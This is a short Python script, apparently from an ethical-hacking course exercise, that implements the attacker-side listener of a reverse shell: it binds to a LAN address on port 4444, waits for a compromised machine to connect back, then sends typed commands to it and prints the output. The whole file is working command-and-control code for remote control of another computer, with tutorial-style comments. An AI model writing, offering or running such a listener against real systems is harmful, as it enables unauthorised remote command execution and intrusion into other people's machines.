import socket

class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[+] Waiting for incomming connections ...")
        self.connection, address = listener.accept()
        # by doning self.connection we are making "connection" variable an attribute of that class so we can use that variable anywhere within the class
        print("[+] Got a connection from " + str(address))


    def execute_remotely(self, command):
        self.connection.send(command)
        result = self.connection.recv(1024)
        return result

    def run(self):
        while True:
            command = input(">> ")
            result = self.execute_remotely(command)
            print(result)

my_listener = Listener("192.168.29.75", 4444)
my_listener.run()